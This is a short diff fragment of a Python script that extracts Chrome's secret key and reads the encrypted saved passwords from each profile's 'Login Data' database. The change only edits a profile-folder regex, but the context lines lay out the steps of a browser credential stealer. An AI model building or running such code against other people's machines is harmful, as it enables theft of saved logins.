@@ -72,7 +72,7 @@ if __name__ == '__main__':
             #(1) Get secret key
             secret_key = get_secret_key()
             #Search user profile or default folder (this is where the encrypted login password is stored)
-            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$|julia",element)!=None]
+            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
             for folder in folders:
             	#(2) Get ciphertext from sqlite database
                 chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
